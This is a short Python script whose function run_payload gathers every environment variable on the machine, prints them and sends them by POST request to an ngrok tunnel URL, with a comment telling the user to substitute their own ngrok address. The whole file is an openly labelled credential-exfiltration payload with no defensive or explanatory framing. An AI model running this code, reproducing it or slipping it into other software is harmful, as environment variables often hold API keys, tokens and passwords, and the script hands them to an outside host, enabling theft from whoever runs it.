import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def run_payload():
    # Collect environment variables
    data = dict(os.environ)
    print("Environment variables collected:", data)

    # Encode the data for POST request
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    
    # Define your Ngrok URL to send the data
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL
    
    # Send the request
    req = urllib.request.Request(url, data=encoded_data)
    try:
        urllib.request.urlopen(req)
        print("Successfully sent environment variables")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")

